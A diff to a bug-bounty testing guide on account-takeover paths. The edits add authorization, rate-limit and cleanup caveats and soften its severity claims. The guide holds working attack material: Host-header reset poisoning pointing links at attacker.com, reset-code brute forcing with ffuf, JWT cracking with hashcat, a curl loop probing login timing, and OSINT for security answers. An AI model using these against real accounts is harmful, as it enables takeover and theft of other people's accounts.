@@ -29,8 +29,10 @@ report_count: 7
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
+Testing below requires rate/request/attempt limits and a stop condition before guessing or recovery messages. Million-code and wordlist examples are illustrative only; prefer a tiny approved fixture set with known valid/invalid cases. Claiming a dangling cloud resource or sending OAuth/reset links requires specific authorization and cleanup. Use disposable controlled identities, never real user passwords or private answers; record sanitized proof rather than tokens. Referenced report IDs/counts are upstream claims, not independently verified evidence in this copy.
+
 ## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
-> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.
+> 11 illustrative paths. ATO is a destination class, not a single bug — each path below is a primitive that has severity assessed only after you demonstrate takeover of a SECOND, explicitly authorized test account B distinct from A and controlled by the assessment owner, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.
 
 ### Path 1: Password Reset Poisoning (Host-Header)
 ```bash
@@ -44,7 +46,7 @@ X-Forwarded-Server: attacker.com
 
 email=victimB@company.com
 ```
-The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
+The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). An email containing a poisoned link proves link construction; token leakage requires a controlled click/request reaching the approved collector. A DNS interaction alone does not prove the reset token arrived.
 **False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.
 
 ### Path 2: Reset Token in Referer / Open-Redirect Leak
@@ -52,7 +54,7 @@ The reset mailer builds the link from the request Host header → link points to
 GET /reset-password?token=ABC123
 → page loads third-party resource: <script src="https://analytics.com/t.js">
 → browser sends  Referer: https://target.com/reset-password?token=ABC123
-→ token exfiltrated to every off-origin host the page calls
+→ full-token leakage is conditional on the effective Referrer-Policy and navigation/resource context; modern strict-origin-when-cross-origin normally sends only the origin cross-origin
 ```
 Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.
 
@@ -69,9 +71,9 @@ ffuf -u "https://target.com/api/reset/verify" -X POST \
 
 ### Path 4: Token No-Expiry / Reuse / Cross-Account
 ```
-Expiry:  request token → wait 2h → still valid? = bug
+Expiry: verify the documented expiry/threat model; an arbitrary 2h wait is not a universal vulnerability threshold
 Reuse:   use token once → use again → still valid? = bug
-Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
+Multi:   test documented multiple-token policy; older tokens remaining valid is not automatically a standalone takeover
 Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
 ```
 
@@ -104,14 +106,14 @@ hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
 ```bash
 # (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
 POST /api/account/password
-Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
+Cookie: session=AUTHORIZED_TEST_B_COOKIE        # from XSS, session-fixation, or token leak
 {"new_password":"Pwned#2026"}          # no "current_password" field
 #
-# (b) login oracle to find a valid password without an existing cookie — measure response delta:
+# (b) login timing comparison to investigate a possible oracle in controlled accounts — measure response delta:
 for p in $(cat candidates.txt); do
   t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
   printf '%s\t%s\n' "$t" "$p"
-done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
+done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, may reveal processing differences; repeated controlled measurements are required and timing alone does not establish a valid password
 ```
 A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).
 
@@ -144,11 +146,8 @@ The victim's account exists in a pending/unverified state (invite not accepted, 
 ### Path 11: Passwordless / Magic-Link Abuse by Identifier
 A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.
 
-### ATO Severity Gate
-- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
-- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
-- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
-- **Low** — attacker must be MitM, or only self-account impact.
+### ATO Severity Assessment
+Assess actual affected privileges, prerequisite credentials, victim interaction, MFA/recovery state, persistence and demonstrated scope against the programme policy and an explicit severity method. Do not assign Critical from a technique name or promise bounty acceptance. A changed password is not proof MFA was bypassed. Stop after the minimum authorized demonstration and restore both test accounts; never enumerate or take over real third-party accounts to establish breadth.
 
 ---
 
@@ -161,7 +160,7 @@ A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a p
 - **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
 - **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
 - **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.
+- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates verified cross-account impact from unsupported severity claims.
 
 ## When to Use
 
